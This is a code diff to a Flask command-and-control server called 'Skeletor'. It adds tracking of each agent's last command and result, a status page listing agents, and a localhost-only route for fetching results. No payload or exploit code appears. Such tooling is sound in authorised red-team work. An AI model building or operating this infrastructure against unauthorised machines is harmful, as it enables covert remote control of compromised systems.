@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-from flask import Flask, request, jsonify, abort, send_from_directory,render_template
+from flask import Flask, request, jsonify, abort, send_from_directory,redirect,url_for
 from flask_sqlalchemy import SQLAlchemy
 import requests
 from datetime import datetime, timezone
@@ -35,6 +35,8 @@ class Agent(db.Model):
     status = db.Column(db.String(20), default='active')
     targeted = db.Column(db.Boolean,default=False)
     last_seen = db.Column(db.DateTime, default=datetime.now(tz=timezone.utc))
+    last_command = db.Column(db.String(5000), nullable=True,default="NULL")
+    last_result = db.Column(db.String(10000), nullable=True,default="NULL")
 
 class Task(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -128,6 +130,8 @@ def submit_results():
         task.returncode = data['returncode']
         if task.result != "NULL":
             task.result = result
+        agent = Agent.query.filter_by(agent_id=agent_id).first()
+        agent.last_result = result
         db.session.commit()
         update_timestamp(agent_id)
         return jsonify({'status': 'success'})
@@ -152,6 +156,9 @@ def get_task():
     ip = request.json.get('agent_id')
     #agent_id = request.args.get('agent_id')
     if ip:
+        agent = Agent.query.filter_by(agent_id=ip).first()
+        if agent is None:
+            return jsonify({"status": "Must re-register"}), 418 #If agent_id isn't in database, tell the client to re-register
         task = Task.query.filter_by(agent_id=ip, completed=False).first()
         if task:
             task_data = {
@@ -160,9 +167,13 @@ def get_task():
                 'filename': task.filename,
                 'task_id': task.id
             }
+            agent.last_command = task.command
+            db.session.commit()
             return jsonify(task_data),200
         return jsonify({"status": "No tasks"}), 204
-    return jsonify({"status": "Must re-register"}), 418
+    else:
+        return jsonify({"status": "Invalid data"}), 400
+        
 
 @app.route('/download/<filename>', methods=['GET'])
 def download_file(filename):
@@ -185,7 +196,15 @@ def upload_file():
     except:
         return jsonify({"error": "Invalid data"}), 400
 
-
+@app.route('/status', methods=['GET'])
+def status():
+    webpage_content = """
+    <h1>Welcome to Skeletor</h1>
+    <h3>Agent Status</h3>
+    """
+    for agent in Agent.query.all():
+        webpage_content += f"<p>{agent.agent_id} - {agent.status}</p>"
+    return webpage_content
 
 # Localhost only routes for manager
 @app.route('/get-agents', methods=['GET'])
@@ -263,17 +282,23 @@ def make_task():
         return jsonify({"message": "Task created successfully"}), 201
     except:
         return jsonify({"error": "Invalid data"}), 400
+    
+@app.route('/get-result', methods=['POST'])
+@restrict_remote
+def get_result():
+    data = request.json
+    agent_id = data.get('agent_id')
+    if agent_id:
+        agent = Agent.query.filter_by(agent_id=agent_id).first()
+        if agent:
+            return jsonify({"command":agent.last_command,"result": agent.last_result}), 200
+        return jsonify({"error": "Agent not found"}), 404
+    return jsonify({"error": "Invalid data"}), 400
 
 #Main Page
 @app.route('/', methods=['GET'])
 def homepage():
-    webpage_content = """
-    <h1>Welcome to Skeletor</h1>
-    <h3>Command and Control</h3>
-    """
-    for agent in Agent.query.all():
-        webpage_content += f"<p>{agent.agent_id} - {agent.status}</p>"
-    return webpage_content
+    return redirect(url_for('status'))
 
 
 def main():
